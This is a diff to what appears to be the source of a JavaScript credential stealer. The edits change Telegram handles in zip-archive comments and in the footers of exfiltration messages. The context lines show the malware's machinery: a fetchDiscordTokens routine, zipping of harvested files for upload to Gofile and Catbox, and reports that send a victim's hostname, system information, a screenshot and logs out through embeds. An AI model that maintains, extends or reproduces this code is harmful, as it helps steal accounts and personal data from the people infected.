@@ -1029,7 +1029,7 @@ async function uploadToGofile(zipFilePath) {
 function createZipArchiveCatbox(sourceDir, zipFilePath) {
     return new Promise((resolve, reject) => {
         const output = fs.createWriteStream(zipFilePath);
-        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | @Wallgod69" });
+        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | t.me/Wallgod69" });
 
         output.on('close', () => resolve(zipFilePath));
         archive.on('error', (error) => {
@@ -1047,7 +1047,7 @@ function createZipArchiveCatbox(sourceDir, zipFilePath) {
 function createZipArchive(sourceDir, zipFilePath) {
     return new Promise((resolve, reject) => {
         const output = fs.createWriteStream(zipFilePath);
-        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | @Wallgod6" });
+        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | t.me/Wallgod69" });
 
         output.on('close', () => resolve(zipFilePath));
         archive.on('error', (error) => {
@@ -1968,7 +1968,7 @@ async function fetchDiscordTokens() {
                                 },
                             ],
                             footer: {
-                                text: `${os.hostname()} | @WallGod69 | t.me/avmtools | ${VERSION}`,
+                                text: `${os.hostname()} | t.me/avmtools | ${VERSION}`,
                                 icon_url: 'https://i.ibb.co/84zCWC73/icon.png'
                             }
                         };
@@ -2049,7 +2049,7 @@ Directory: ${user.fileLoc} `;
                 description: '‎',
                 color: 0x303037,
                 author: {
-                    name: `${user.hostname} | System Information | @WallGod69`,
+                    name: `${user.hostname} | System Information | t.me/Wallgod69`,
                     icon_url: 'https://i.ibb.co/84zCWC73/icon.png',
                 },
                 fields: [
@@ -2094,7 +2094,7 @@ Directory: ${user.fileLoc} `;
                 ],
                 image: { url: 'attachment://screenshot.png' },
                 footer: {
-                    text: computerName + " | @Wallgod69 | t.me/avmtools | " + VERSION,
+                    text: computerName + " | t.me/avmtools | " + VERSION,
                     icon_url: "https://i.ibb.co/84zCWC73/icon.png"
                 }
             }]
@@ -2190,11 +2190,11 @@ Directory: ${user.fileLoc} `;
                             description: `\`\`\`text\n${logChunks[i]}\n\`\`\``,
                             color: 0x303037,
                             author: {
-                                name: `${user.hostname} | Error Log | @WallGod69`,
+                                name: `${user.hostname} | Error Log | t.me/Wallgod69`,
                                 icon_url: 'https://i.ibb.co/84zCWC73/icon.png',
                             },
                             footer: {
-                                text: `${computerName} | @Wallgod69 | t.me/avmtools | ${VERSION}`,
+                                text: `${computerName} | t.me/avmtools | ${VERSION}`,
                                 icon_url: "https://i.ibb.co/84zCWC73/icon.png"
                             }
                         };
@@ -3059,3 +3059,4 @@ function checkSystem() {
     }
 
 })();
+
